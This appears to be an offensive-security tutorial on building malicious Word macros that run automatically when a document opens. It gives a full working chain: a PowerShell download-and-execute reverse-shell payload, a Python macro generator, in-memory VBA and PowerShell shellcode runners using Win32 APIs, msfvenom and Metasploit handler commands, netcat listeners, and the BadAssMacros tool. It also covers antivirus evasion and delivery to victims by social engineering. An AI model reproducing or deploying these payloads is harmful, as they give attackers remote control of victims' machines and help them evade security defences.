### Process for generating malicious VBA Macro

1. Start with the following Powershell payload:
```powershell
$payload = "IEX(New-Object System.Net.WebClient).DownloadString('http://<OurIP>/powercat.ps1');powercat -c <OurIP> -p 4444 -e powershell"
```
2. Base64 Encode with Powershell (nb. you _will_ get a different result if you just `echo <payload> | base64` in Bash, use the code below):
```powershell
$b64EncodedPayload = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
$b64EncodedPayload
```
3. Feed the encoded payload as a command line arg to this Python script:
```python
import sys

print('''Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
''')
payload = f"powershell.exe -nop -w hidden -e {sys.argv[1]}"
n = 50
for i in range(0, len(payload), n):
    print(f'    Str = Str + \"{payload[i:i+n]}\"')
print('\n    CreateObject("Wscript.Shell").Run Str')
print('End Sub')
```
4. With our macro ready spin up a Windows machine that has office on it and create a Word doc with filetype `.doc`. This should be the 1997-2003 flavour. Then navigate to `View -> Macros`. Create a new macro in the file you've created and copy the macro we produced in step 3 into it.
5. If necessary exfiltrate the file via SCP:
```powershell
scp macro.doc kali@<our IP>:/home/kali
```
make sure an SSH server is running on the Kali machine:
```bash
sudo systemctl start ssh
```
6. Before distributing ensure an HTTP server is running in the same directory as a copy of `powercat.ps1`:
```bash
python3 -m http.server 80
```
and finally ensure a netcat listener is waiting for the shell:
```bash
nc -nvlp 4444
```
7. Distribute the payload via social engineering or file upload based vuln.

### A More Subtle Malicious VBA Macro

The approach above is good, but not very subtle. It involves writing a file to disk, and launching Powershell, which may be considered spicy by Antivirus and Defender or other countermeasures present on a machine. The most subtle approach we could possibly take is to make calls to Win32 APIs directly from VBA and to launch a staged payload. This keeps everything in memory, with minimal footprint for the initial payload, involving as few other applications as possible, and writing nothing to disk.

The major drawback is that once the victim closes the Office application running the macro the shell dies. We have traded subtlety for persistence.

First, get an `msfconsole` multi/handler ready to receive a staged payload, staged is now preferred since it means a much smaller initial payload that needs to be inserted into the macro. Commands to get the handler going are as follows:
```bash
sudo msfconsole -q
```
```bash
use multi/handler
```
```bash
set payload windows/x64/meterpreter/reverse_https
```
```bash
set lhost 192.168.0.1
```
```bash
set lport 443
```
```bash
exploit
```

Now, use `msfvenom` to generate a VBA compatible bit of shellcode
```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.1 LPORT=443 EXITFUNC=thread -f vbapplication
```
Copy the output of the above into the `buf = Array(20, 30,50, ...` section of the marco below. Our full malicious Macro is as follows:
```vba
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    buf = Array(20, 30, 40, ... )

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

### A Blend of the 2

Keeping things entirely in the memory of the running application is dubiously stable, however downloading and running Powercat to spawn our shell gets zero points for subtlety. There is a middle ground. We can download a payload from our attack machine that will consist of a Powershell script, however this script will be more subtle than Powercat, it will make use of calls to Win32 APIs and DelegateTypes in C\# to keep the resulting exploit entirely in memory, avoiding writing to any files. It will spawn Powershell processes, so may be flagged as suspicious by Defender, but it ought to invisible to a file-based Antivirus.

The following Powershell will serve as our payload, save it as `run.ps1` in a directory from which we're serving a web server:
```powershell
function LookupFunc {
	Param ($moduleName, $functionName)
	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object {
            $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')
        })
        .GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)
	$type = [AppDomain]::CurrentDomain
        .DefineDynamicAssembly(
            (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
            [System.Reflection.Emit.AssemblyBuilderAccess]::Run
        )
        .DefineDynamicModule('InMemoryModule', $false)
        .DefineType(
            'MyDelegateType',
            'Class, Public, Sealed, AnsiClass, AutoClass',
            [System.MulticastDelegate]
        )
    $type
        .DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func)
        .SetImplementationFlags('Runtime, Managed')
    $type
        .DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func)
        .SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0x0,0x0,0x0,0x0,0x0,0x0...

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

Substitute the `[Byte[]] $buf = 0x0,0x0,0x0,0x0,0x0,0x0...` with the output from the following:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=80 EXITFUNC=thread -f ps1
```

Finally, our macro should look like so. Very similar to the original, but a slight variant to give us more versions of the VBA to experiment with should the exploit not work for any reason.
```vba
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.0.1:81/run.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

Before executing, don't forget to start the web server:
```bash
python3 -m http.server 81
```
and also don't forget to get the staged meterpreter listener ready:
```bash
sudo msfconsole -q
```
```bash
use multi/handler
```
```bash
set payload windows/meterpreter/reverse_tcp
```
```bash
set lhost 192.168.0.1
```
```bash
set lport 80
```
```bash
exploit
```

### BadAssMacros

As usual this has been a massive 'from first principles' breakdown in order to check our understanding of the funamentals. In practice an exquisite tool exists to do most of the heavy lifting for us: `BadAssMacros`. The repo we get this from is here: https://github.com/Inf0secRabbit/BadAssMacros. See the `README.md` for a full breakdown of the flags.

The following command provides some sane defaults that will generate the raw text of the VBA Macro which we need to insert into our Word doc. Obviously we will potentially need to adjust these to our use case:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.x.y LPORT=80 EXITFUNC=thread -f raw > shellcode.bin
```
```bash
```

```powershell
.\BadAssMacrosx86.exe -i shellcode.bin -w doc -p no -s indirect -c 10 -o macro.txt
```